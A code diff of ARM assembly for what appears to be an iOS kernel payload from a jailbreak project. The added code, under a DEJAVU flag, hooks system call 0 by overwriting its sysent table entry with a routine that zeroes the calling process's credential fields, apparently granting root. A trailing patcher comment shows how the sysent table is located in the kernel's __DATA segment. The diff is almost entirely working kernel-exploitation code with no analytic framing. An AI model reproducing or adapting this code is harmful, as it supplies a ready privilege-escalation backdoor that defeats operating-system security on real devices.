@@ -7,12 +7,12 @@ start:
     adr r0, inspiring
     bl _IOLog
 
-    mov r8, #0; b end
+    #mov r8, #0; b end; foo
 
     adr r5, stuff
     ldr r8, count
-pf_loop:
 
+pf_loop:
     ldm r5, {r0, r2}
     add r1, r5, #8
     bl _memcpy
@@ -38,26 +38,36 @@ end:
     add r0, r6, #0x220
     str r0, [r6, #0x220]
     str r0, [r6, #0x224]
-#if 0
 
-    ;# stop and start (94, 93)
-    ldr r5, [r6]
-    mov r0, r6
-    ldr r1, [r6, #0x294]
-    mov lr, pc
-    ldr pc, [r5, #(94*4)]
-
-    mov r0, r6
-    ldr r1, [r6, #0x294]
-    mov lr, pc
-    ldr pc, [r5, #(93*4)]
+#ifdef DEJAVU
+    ldr r0, sysent
+    adr r1, syscall_0
+    str r1, [r0, #0x4]
 #endif
 
     pop {r8, r10, r11}
     pop {r4-r7, pc}
 
+#ifdef DEJAVU
+syscall_0:
+    push {lr} 
+    bl _proc_ucred
+    mov r1, #0
+    str r1, [r0, #0xc]
+    ldr r0, [r0, #0x6c]
+    cmp r0, #0
+    strne r1, [r0, #8]
+    ldr r0, sysent
+    ldr r1, [r0, #0xc4]
+    str r1, [r0, #0x4]
+    pop {pc}
+#endif
+
 inspiring: .asciz "I exist!\n"
 .align 2
 
+sysent: .long 0
 count: .long 0
 stuff:
+    
+    #patch("sysent", 0, uint32_t, {find_int32(b_macho_segrange(binary, "__DATA"), 0x861000, true) + 4});
